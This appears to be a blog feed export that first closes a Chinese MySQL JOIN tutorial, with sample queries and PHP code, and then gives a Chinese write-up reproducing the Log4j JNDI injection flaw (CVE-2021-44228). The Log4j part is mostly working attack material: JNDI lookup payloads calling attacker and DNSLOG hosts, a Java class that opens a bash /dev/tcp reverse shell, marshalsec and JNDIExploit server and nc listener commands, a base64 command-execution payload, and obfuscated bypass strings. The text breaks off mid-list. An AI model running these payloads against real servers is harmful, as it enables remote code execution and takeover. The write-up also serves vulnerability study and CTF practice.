runoob_tbl。两张数据表数据如下：</p><p>实例</p><p>尝试以下实例：</p><p>测试实例数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB; Database changed mysql&gt; SELECT * FROM tcount_tbl; +---------------+--------------+ | runoob_author | runoob_count | +---------------+--------------+ | 菜鸟教程  | 10           | | RUNOOB.COM    | 20           | | Google        | 22           | +---------------+--------------+ 3 rows in set (0.01 sec)  mysql&gt; SELECT * from runoob_tbl; +-----------+---------------+---------------+-----------------+ | runoob_id | runoob_title  | runoob_author | submission_date | +-----------+---------------+---------------+-----------------+ | 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      | | 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      | | 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      | | 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      | | 5         | 学习 C      | FK            | 2017-04-05      | +-----------+---------------+---------------+-----------------+ 5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>接下来我们就使用MySQL的**INNER JOIN(也可以省略 INNER 使用 JOIN，效果一样)**来连接以上两张表来读取runoob_tbl表中所有runoob_author字段在tcount_tbl表对应的runoob_count字段值：</p><h2 id="INNER-JOIN"><a href="#INNER-JOIN" class="headerlink" title="INNER JOIN"></a>INNER JOIN</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | +-------------+-----------------+----------------+ 4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>以上 SQL 语句等价于：</p><p>WHERE 子句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a, tcount_tbl b WHERE a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | +-------------+-----------------+----------------+ 4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p><img src="img_innerjoin.gif" alt="img"></p><p>MySQL LEFT JOIN</p><p>MySQL left join 与 join 有所不同。 MySQL LEFT JOIN 会读取左边数据表的全部数据，即便右边表无对应数据。</p><p>实例</p><p>尝试以下实例，以 <strong>runoob_tbl</strong> 为左表，<strong>tcount_tbl</strong> 为右表，理解 MySQL LEFT JOIN 的应用：</p><p>LEFT JOIN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a LEFT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | | 5           | FK              | NULL           | +-------------+-----------------+----------------+ 5 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">以上实例中使用了 LEFT JOIN，该语句会读取左边的数据表 runoob_tbl 的所有选取的字段数据，即便在右侧表 tcount_tbl中 没有对应的 runoob_author 字段值。</span><br></pre></td></tr></table></figure><p><img src="img_leftjoin.gif" alt="img"></p><p>MySQL RIGHT JOIN</p><p>MySQL RIGHT JOIN 会读取右边数据表的全部数据，即便左边边表无对应数据。</p><p>实例</p><p>尝试以下实例，以 <strong>runoob_tbl</strong> 为左表，<strong>tcount_tbl</strong> 为右表，理解MySQL RIGHT JOIN的应用：</p><p>RIGHT JOIN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a RIGHT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author; +-------------+-----------------+----------------+ | a.runoob_id | a.runoob_author | b.runoob_count | +-------------+-----------------+----------------+ | 1           | 菜鸟教程    | 10             | | 2           | 菜鸟教程    | 10             | | 3           | RUNOOB.COM      | 20             | | 4           | RUNOOB.COM      | 20             | | NULL        | NULL            | 22             | +-------------+-----------------+----------------+ 5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>以上实例中使用了 RIGHT JOIN，该语句会读取右边的数据表 tcount_tbl 的所有选取的字段数据，即便在左侧表 runoob_tbl 中没有对应的runoob_author 字段值。</p><p><img src="img_rightjoin.gif" alt="img"></p><p>在 PHP 脚本中使用 JOIN</p><p>PHP 中使用 mysqli_query() 函数来执行 SQL 语句，你可以使用以上的相同的 SQL 语句作为 mysqli_query() 函数的参数。</p><p>尝试如下实例:</p><p>MySQL ORDER BY 测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址 $dbuser = &#x27;root&#x27;;            // mysql用户名 $dbpass = &#x27;123456&#x27;;          // mysql用户名密码 $conn = mysqli_connect($dbhost, $dbuser, $dbpass); if(! $conn ) &#123;     die(&#x27;连接失败: &#x27; . mysqli_error($conn)); &#125; // 设置编码，防止中文乱码 mysqli_query($conn , &quot;set names utf8&quot;);   $sql = &#x27;SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author&#x27;;   mysqli_select_db( $conn, &#x27;RUNOOB&#x27; ); $retval = mysqli_query( $conn, $sql ); if(! $retval ) &#123;     die(&#x27;无法读取数据: &#x27; . mysqli_error($conn)); &#125; echo &#x27;&lt;h2&gt;菜鸟教程 MySQL JOIN 测试&lt;h2&gt;&#x27;; echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;登陆次数&lt;/td&gt;&lt;/tr&gt;&#x27;; while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC)) &#123;     echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.          &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.          &quot;&lt;td&gt;&#123;$row[&#x27;runoob_count&#x27;]&#125; &lt;/td&gt; &quot;.          &quot;&lt;/tr&gt;&quot;; &#125; echo &#x27;&lt;/table&gt;&#x27;; mysqli_close($conn); ?&gt;</span><br></pre></td></tr></table></figure><p>输出结果如下图所示：</p><p><img src="75178A78-101C-44E3-B5B5-F20B3E7445CB.jpg" alt="img"></p><h2 id="SQL-JOIN-中-on-与-where-的区别"><a href="#SQL-JOIN-中-on-与-where-的区别" class="headerlink" title="SQL JOIN 中 on 与 where 的区别"></a>SQL JOIN 中 on 与 where 的区别</h2><p><img src="1528881587-3295-201505.png" alt="img"></p><ul><li><strong>left join</strong> : 左连接，返回左表中所有的记录以及右表中连接字段相等的记录。</li><li><strong>right join</strong> : 右连接，返回右表中所有的记录以及左表中连接字段相等的记录。</li><li><strong>inner join</strong> : 内连接，又叫等值连接，只返回两个表中连接字段相等的行。</li><li><strong>full join</strong> : 外连接，返回两个表中的行：left join + right join。</li><li><strong>cross join</strong> : 结果是笛卡尔积，就是第一个表的行数乘以第二个表的行数。</li></ul><h3 id="关键字-on"><a href="#关键字-on" class="headerlink" title="关键字 on"></a>关键字 on</h3><p>数据库在通过连接两张或多张表来返回记录时，都会生成一张中间的临时表，然后再将这张临时表返回给用户。</p><p>在使用 <strong>left jion</strong> 时，<strong>on</strong> 和 <strong>where</strong> 条件的区别如下：</p><ul><li>1、 <strong>on</strong> 条件是在生成临时表时使用的条件，它不管 <strong>on</strong> 中的条件是否为真，都会返回左边表中的记录。</li><li>2、<strong>where</strong> 条件是在临时表生成好后，再对临时表进行过滤的条件。这时已经没有 <strong>left join</strong> 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。</li></ul><p>假设有两张表：</p><p><strong>表1：tab1</strong></p><table><thead><tr><th>id</th><th>size</th></tr></thead><tbody><tr><td>1</td><td>10</td></tr><tr><td>2</td><td>20</td></tr><tr><td>3</td><td>30</td></tr></tbody></table><p><strong>表2：tab2</strong></p><table><thead><tr><th>size</th><th>name</th></tr></thead><tbody><tr><td>10</td><td>AAA</td></tr><tr><td>20</td><td>BBB</td></tr><tr><td>20</td><td>CCC</td></tr></tbody></table><p>两条 SQL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from tab1 left join tab2 on (tab1.size = tab2.size) where tab2.name=&#x27;AAA&#x27;</span><br><span class="line"></span><br><span class="line">select * from tab1 left join tab2 on (tab1.size = tab2.size and tab2.name=&#x27;AAA&#x27;)</span><br></pre></td></tr></table></figure><p>第一条SQL的过程： 1、中间表 on条件: tab1.size = tab2.sizetab1.idtab1.sizetab2.sizetab2.name11010AAA22020BBB22020CCC330(null)(null)  2、再对中间表过滤 where 条件： tab2.name=’AAA’tab1.idtab1.sizetab2.sizetab2.name11010AAA  </p><p>第二条SQL的过程： 1、中间表 on条件: tab1.size = tab2.size and tab2.name=’AAA’ (条件不为真也会返回左表中的记录)tab1.idtab1.sizetab2.sizetab2.name11010AAA220(null)(null)330(null)(null) </p><p>其实以上结果的关键原因就是 <strong>left join、right join、full join</strong> 的特殊性，不管 <strong>on</strong> 上的条件是否为真都会返回 <strong>left</strong> 或 <strong>right</strong> 表中的记录，<strong>full</strong> 则具有 <strong>left</strong> 和 <strong>right</strong> 的特性的并集。 而 <strong>inner jion</strong> 没这个特殊性，则条件放在 <strong>on</strong> 中和 <strong>where</strong> 中，返回的结果集是相同的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>apachelog4j漏洞复现</title>
      <link href="/2021/12/18/apachelog4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/12/18/apachelog4j%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Log4j-漏洞（JNDI注入-CVE-2021-44228）"><a href="#Apache-Log4j-漏洞（JNDI注入-CVE-2021-44228）" class="headerlink" title="Apache Log4j 漏洞（JNDI注入 CVE-2021-44228）"></a>Apache Log4j 漏洞（JNDI注入 CVE-2021-44228）</h1><p>原理：<a href="https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg">https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg</a></p><p>总结一下就是，日志中${}中的部分会被当作lookup函数的参数。</p><p>apacjhe log4j中的lookup作用是方便系统将特殊的值添加到日志之中，例如${hostname}就是主机名</p><p>只能说期末复习杀我   </p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6b6Z5Zyo5bGx5Lic,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p><p>漏洞影响范围</p><blockquote><p>2.0 &lt;= Apache log4j &lt;= 2.14.1</p></blockquote><pre><code>import org.apache.log4j.Logger;import java.io.*;import java.sql.SQLException;import java.util.*;public class VulnerableLog4jExampleHandler implements HttpHandler &#123;  static Logger log = Logger.getLogger(log4jExample.class.getName());  /**   * A simple HTTP endpoint that reads the request&#39;s User Agent and logs it back.   * This is basically pseudo-code to explain the vulnerability, and not a full example.   * @param he HTTP Request Object     */       public void handle(HttpExchange he) throws IOException &#123;       string userAgent = he.getRequestHeader(&quot;user-agent&quot;);// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;log.info(&quot;Request User Agent:&quot; + userAgent);String response = &quot;&lt;h1&gt;Hello There, &quot; + userAgent + &quot;!&lt;/h1&gt;&quot;;he.sendResponseHeaders(200, response.length());OutputStream os = he.getResponseBody();os.write(response.getBytes());os.close();  &#125;&#125;</code></pre><blockquote><p>Data from the User gets sent to the server (via any protocol),<br>The server logs the data in the request, containing the malicious payload: ${jndi:ldap://attacker.com/a} (where attacker.com is an attacker controlled server),<br>The log4j vulnerability is triggered by this payload and the server makes a request to attacker.com via “Java Naming and Directory Interface” (JNDI),<br>This response contains a path to a remote Java class file (ex. <a href="http://second-stage.attacker.com/Exploit.class">http://second-stage.attacker.com/Exploit.class</a>) which is injected into the server process,<br>This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.</p></blockquote><p>另一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">public class Poc &#123;</span><br><span class="line">    private static final Logger log = LogManager.getLogger();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        log.error(&quot;$&#123;jndi:rmi://127.0.0.1:1099/xxxx&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bCP6b6Z5Zyo5bGx5Lic,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764251.png" alt="1"></p><h1 id="ctfshow复现"><a href="#ctfshow复现" class="headerlink" title="ctfshow复现"></a>ctfshow复现</h1><p>我们通过JNDI注入请求DNSLOG的恶意语句，如果在DNSLOG端能查看到访问记录，则证明远程代码执行漏洞存在</p><p>我们CTFshow的靶场来做后续验证</p><p>我们直接在登录框输入恶意代码：</p><blockquote><p>${jndi:ldap://hackerj.5ymw72.dnslog.cn/exp}</p></blockquote><p>然后我们成功在DNSLOG端查看到访问记录，证实这里漏洞存在</p><p><img src="image-20211217195542264.png" alt="image-20211217195542264"></p><p>在vps</p><p>启一个python服务启一个java服务 监听反弹的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这个东西需要在vps上编译 妈的因为这个编译问题只能执行弹不了shell卡了好久</span><br><span class="line">public class Test &#123;</span><br><span class="line">        static&#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Runtime r = Runtime.getRuntime();</span><br><span class="line">                String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xxx/50025;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">                Process p = r.exec(cmd);</span><br><span class="line">                p.waitFor();</span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE20211220145859.png" alt="QQ浏览器截图20211220145859"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 50026</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://xxx:50026/#Test&quot;</span><br><span class="line"></span><br><span class="line">nc -lvnp 50025</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE20211220145851.png" alt="QQ浏览器截图20211220145851"></p><p><img src="QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE20211220145856.png" alt="QQ浏览器截图20211220145856"></p><p>payload：${jndi:ldap://101.35.158.27:1389/Test}</p><p><img src="2.png" alt="image-20211220162619219"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞代码在log4j-core与log4j-api这两个jar包中。</span><br></pre></td></tr></table></figure><p>环境：<a href="https://github.com/shanfenglan/apache_log4j_poc">https://github.com/shanfenglan/apache_log4j_poc</a></p><p>利用条件<br>2.0 &lt;= Log4j -2 &lt;= 2.14.1</p><p>环境搭建<br>依赖的xml配置在这里查找：<a href="https://mvnrepository.com/artifact/org.slf4j/slf4j-api/1.7.25">https://mvnrepository.com/artifact/org.slf4j/slf4j-api/1.7.25</a></p><p>使用idea创建一个Maven项目，并在pom.xml中添加漏洞版本Apache log4j的相关依赖，分别为log4j-core与log4j-api，最终完整的含具体pom.xml文件如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;org.example&lt;/groupId&gt;    &lt;artifactId&gt;log4j-rce&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;dependencies&gt;        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;            &lt;version&gt;2.14.1&lt;/version&gt;        &lt;/dependency&gt;        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;            &lt;version&gt;2.14.1&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;</code></pre><p>然后创建一个java文件内容如下：</p><pre><code>import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;</code></pre><p>​    </p><pre><code>public class Log4j &#123;    private static final Logger logger = LogManager.getLogger(Log4j.class);    public static void main(String[] args) &#123;        logger.error(&quot;$&#123;jndi:ldap://192.168.171.1:12344/a&#125;&quot;);    &#125;&#125;</code></pre><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p><p>执行这个java文件即可利用漏洞。</p><p><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p><p>利用<br>poc：</p><blockquote><p>${jndi:ldap://192.168.171;1:12344/Basic/Command/whoami}</p></blockquote><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764262.png" alt="在这里插入图片描述"></p><p>补充：命令执行部分<br>这个命令执行是本地的命令执行，也就是说恶意的class文件必须得和漏洞利用点所在的文件在同一文件夹或者同一个jar包内，举例如下：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764263.png" alt="在这里插入图片描述"></p><p>log4j这个class是漏洞文件，执行后可以利用漏洞。<br>Log4jRCE是恶意的class文件，作用是在tmp下创建一个文件，名为123。<br>Tttouch是恶意的class文件，作用是在tmp下创建一个文件，名为1.txt。</p><p>我们先看看log4j.java的内容：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764264.png" alt="在这里插入图片描述"></p><p>启动jndi服务端命令：</p><blockquote><p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://127.0.0.1:8888/#Tttouch&quot;">http://127.0.0.1:8888/#Tttouch&quot;</a></p></blockquote><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764265.png" alt="在这里插入图片描述"></p><p>当上述三个class文件在同一文件夹内的时候，执行这个log4j之后tmp结果如下：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764266.png" alt="在这里插入图片描述"></p><p>此时我们将Tttouch.class移动到另一个文件夹下，反正不与log4j放在同一文件夹：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764267.png" alt="在这里插入图片描述"></p><p>此时再次执行log4j，tmp文件夹中无新增文件：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764268.png" alt="在这里插入图片描述"></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-16398067764269.png" alt="在这里插入图片描述"></p><p>1.txt并没有被创建</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642710.png" alt="在这里插入图片描述"></p><p>此时我们复制一个Tttouch.class放在和log4j在同一文件夹下，然后将jndi服务器路径下的Tttouch删掉，接着执行log4j：</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642711.png" alt="在这里插入图片描述"></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642712.png" alt="在这里插入图片描述"></p><p>1.txt再次出现了！！要知道，我们JNDI服务器根本没有这个类！</p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642713.png" alt="在这里插入图片描述"></p><p>总结<br>这个漏洞给我的感觉是可以触发jndi注入，但是不会从我们的jndi服务器上拉取任何文件，而是仅仅判断这个文件本地是否存在，存在则执行，不存在则不执行。传统的jndi注入受害者会想下载我们创建的恶意class文件并实例化，此次好像并不是这样。</p><blockquote><p>补充：如何将其变成正常的JNDI注入(及可加载攻击者自定义的class文件)<br>条件：如果我们使用LDAP方式的jndi注入，受害者服务器的代码中java的配置必须是com.sun.jndi.ldap.object.trustURLCodebase=True。</p></blockquote><p>JDK中的默认配置如下：</p><blockquote><p>JDK 5U45、6U45、7u21、8u121开始java.rmi.server.useCodebaseOnly默认位置true<br>JDK 6u132、7u122、8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值false<br>JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase默认为false</p></blockquote><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642714.png" alt="在这里插入图片描述"></p><p>因此我们需要在log4j的代码中加上：</p><blockquote><p>System.setProperty(“com.sun.jndi.ldap.object.trustURLCodebase”,”true”)</p></blockquote><pre><code>最终代码如下：import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;</code></pre><p>​    </p><pre><code>public class Log4j &#123;    private static final Logger logger = LogManager.getLogger(Log4j.class);    public static void main(String[] args) &#123;        //dG91Y2ggL3RtcC8xMjM 是touch /tmp/123的base64编码        System.out.println(&quot;开始执行漏洞利用&quot;);        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:12344/Basic/Command/Base64/dG91Y2ggL3RtcC8xMjM&#125;&quot;);        System.out.println(&quot;利用完成&quot;);    &#125;&#125;</code></pre><p>执行命令：</p><p>使用JNDIExploit开启jndi服务器：</p><p><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.171.1 -l 12344 -p 9999 </code></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642715.png" alt="在这里插入图片描述"></p><p><img src="watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642716.png" alt="在这里插入图片描述"></p><p>参考文章：<a href="https://www.codenong.com/f23e29b783ff38df36c9/">https://www.codenong.com/f23e29b783ff38df36c9/</a></p><p><img src="%7Bfilename%7D/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16-163980677642717.png" alt="在这里插入图片描述"></p><blockquote><p>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。<br>这个漏洞的利用跟JDK中的配置有很大关系，换句话说跟jdk版本关系很大。<br>只要JDK版本无漏洞，那么apache log4j的这个RCE就很难利用成功。</p></blockquote><blockquote></blockquote><h1 id="本地快速复现"><a href="#本地快速复现" class="headerlink" title="本地快速复现"></a>本地快速复现</h1><p>01<strong>参 考 资 料</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Yihsiwei/Log4j-exp</span></span><br></pre></td></tr></table></figure><p>02<strong>本地复现步骤</strong></p><p>复现环境：</p><p>windows10 + 1.8.40 + idea2021.3</p><p>win10 ip地址：<code>192.168.43.217</code></p><p>首先需要下载<code>Log4j-exp</code></p><p><img src="image-20211218132207551.png" alt="image-20211218132207551"></p><p>现在去刚下载的文件里面找到<code>JNDIExploit-1.2-SNAPSHOT.jar</code>所在的文件夹，并使用<code>cmd</code>打开，执行以下命令：</p><p><img src="image-20211218132239261.png" alt="image-20211218132239261"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-<span class="number">1.2</span>-SNAPSHOT.jar -i <span class="number">10.211</span><span class="number">.55</span><span class="number">.3</span></span><br><span class="line">-i  后面接的是本地的ip地址(或者你的VPS地址)</span><br></pre></td></tr></table></figure><p>回到你刚打开的idea中，找到<code>log4jRCE</code>文件，将该文件中箭头位置的ip地址进行替换成要攻击的ip。</p><p>替换成功之后,进行build：</p><p>继续<code>build</code></p><p>然后在刚才的目录下会生成一个<code>out</code>的文件夹：</p><p>点进去会找到一个<code>Log4j-rce.jar</code>文件。</p><p>直接点开也行   也可以使用以下命令：</p><p><img src="image-20211218132311296.png" alt="image-20211218132311296"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dcom.sun.jndi.ldap.object.trustURLCodebase=<span class="literal">true</span> -jar Log4j-rce.jar</span><br></pre></td></tr></table></figure><p><img src="image-20211218132335722.png" alt="image-20211218132335722"></p><p>打开任务管理器的</p><p><img src="image-20211218134630551.png" alt="image-20211218134630551"></p><p>Bypass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://asdasd.asdasd.asdasd/poc&#125;</span><br><span 